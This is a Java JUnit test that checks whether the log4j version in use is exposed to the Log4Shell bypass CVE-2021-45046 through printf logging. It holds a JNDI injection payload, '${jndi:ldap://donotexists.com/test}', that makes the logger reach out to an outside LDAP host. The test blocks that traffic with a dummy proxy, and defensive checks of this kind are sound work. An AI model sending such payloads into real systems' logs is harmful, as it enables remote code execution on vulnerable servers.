package eu.righettod;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.appender.ConsoleAppender;
import org.apache.logging.log4j.core.config.Configurator;
import org.apache.logging.log4j.core.config.builder.api.AppenderComponentBuilder;
import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilder;
import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;
import org.apache.logging.log4j.core.config.builder.api.RootLoggerComponentBuilder;
import org.apache.logging.log4j.core.config.builder.impl.BuiltConfiguration;
import org.junit.After;
import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.TimeUnit;

/**
 * Test suite to ensure that the current version used of log4j-core is not exposed to log4shell vulnerability for CVE-2021-45046
 * with the "log4j2.formatMsgNoLookups=true" bypass and using the "log.printf()" function.
 *
 * @see "https://www.studytonight.com/post/log4j2-programmatic-configuration-in-java-class"
 * @see "https://docs.oracle.com/javase/7/docs/technotes/guides/net/properties.html"
 */
public class Log4ShellExposureTestFormatMsgNoLookupsBypassWithPrintf {

    private static final String TEST_PAYLOAD = "${jndi:ldap://donotexists.com/test}";
    private static final String TEST_FAILED_MARKER = "Error looking up JNDI resource";
    private Logger victim;
    private final ByteArrayOutputStream captureStream = new ByteArrayOutputStream();
    private final PrintStream currentSystemOut = System.out;
    private final PrintStream currentSystemErr = System.err;

    @Before
    public void testSuiteSetup() throws Exception {
        //Capture SystemOut and SystemErr
        PrintStream ps = new PrintStream(captureStream);
        System.setOut(ps);
        System.setErr(ps);
        //Remove any HTTP/FTP proxy
        System.setProperty("java.net.useSystemProxies", "false");
        List<String> proxyProperties = Arrays.asList("https.proxyHost", "https.proxyPort", "https.nonProxyHosts", "http.proxyHost", "http.proxyPort", "http.nonProxyHosts", "ftp.proxHost", "ftp.proxyPort", "ftp.nonProxyHosts");
        proxyProperties.forEach(p -> System.getProperties().remove(p));
        //Set a SOCK nonexistent proxy to prevent any data to be sent out or any call to exit the network
        System.setProperty("proxySet", "true");
        System.setProperty("socksProxyHost", "10.10.10.10");
        System.setProperty("socksProxyPort", "1111");
        //Set a quick socket timeout to speed up the test
        System.setProperty("sun.net.client.defaultConnectTimeout", "2000");
        System.setProperty("sun.net.client.defaultReadTimeout", "2000");
        //Setup the logger
        ConfigurationBuilder<BuiltConfiguration> builder = ConfigurationBuilderFactory.newConfigurationBuilder();
        builder.setStatusLevel(Level.INFO);
        builder.setConfigurationName("DefaultLogger");
        AppenderComponentBuilder appenderBuilder = builder.newAppender("Console", "CONSOLE");
        appenderBuilder.addAttribute("target", ConsoleAppender.Target.SYSTEM_OUT);
        appenderBuilder.add(builder.newLayout("PatternLayout").addAttribute("pattern", "%m%n"));
        RootLoggerComponentBuilder rootLogger = builder.newRootLogger(Level.INFO);
        rootLogger.add(builder.newAppenderRef("Console"));
        builder.add(appenderBuilder);
        builder.add(rootLogger);
        //Configurator.reconfigure(builder.build());
        //Use this method is reconfigure(() do not exists in the log4j2 tested version
        Configurator.initialize(builder.build());
        //Enable the security flag
        System.setProperty("log4j2.formatMsgNoLookups", "true");
        //Setup the logger used
        victim = LogManager.getRootLogger();
        //Display execution context
        System.out.printf("LOG4J2 version: %s\n", victim.getClass().getPackage().getImplementationVersion());
        System.out.printf("Java version  : %s\n", System.getProperty("java.version"));
    }

    @After
    public void testSuiteFinalize() throws Exception {
        //Reset SystemOut and SystemErr to original ones
        System.setOut(currentSystemOut);
        System.setErr(currentSystemErr);
        //Remove the SOCK proxy
        System.getProperties().remove("proxySet");
        System.getProperties().remove("socksProxyHost");
        System.getProperties().remove("socksProxyPort");
        //Remove socket timeout
        System.getProperties().remove("sun.net.client.defaultConnectTimeout");
        System.getProperties().remove("sun.net.client.defaultReadTimeout");
    }

    @Test
    public void testExposure() throws Exception {
        //Ensure that the security flag is enabled
        Assert.assertNotNull("Flag 'log4j2.formatMsgNoLookups' must be set!", System.getProperty("log4j2.formatMsgNoLookups"));
        Assert.assertTrue("Flag 'log4j2.formatMsgNoLookups' must be enabled!", Boolean.parseBoolean(System.getProperty("log4j2.formatMsgNoLookups")));
        //Log the payload
        victim.printf(Level.INFO, "%s", TEST_PAYLOAD);
        //Let's time to logger to write the content to the appender and any JNDI lookup to be attempted
        TimeUnit.SECONDS.sleep(10);
        //Check if any JNDI lookup tentative was performed
        String out = captureStream.toString(StandardCharsets.UTF_8);
        //Save the output for ease debugging operations
        Files.deleteIfExists(Paths.get("target", "Log4ShellExposureTestFormatMsgNoLookupsBypassWithPrintf.out"));
        Files.writeString(Paths.get("target", "Log4ShellExposureTestFormatMsgNoLookupsBypassWithPrintf.out"), out, StandardCharsets.UTF_8, StandardOpenOption.CREATE);
        //Apply assertion using the JNDI lookup marker
        Assert.assertFalse("JNDI lookup tentative identified, see target/Log4ShellExposureTestFormatMsgNoLookupsBypassWithPrintf.out file for details.", out.contains(TEST_FAILED_MARKER));
    }
}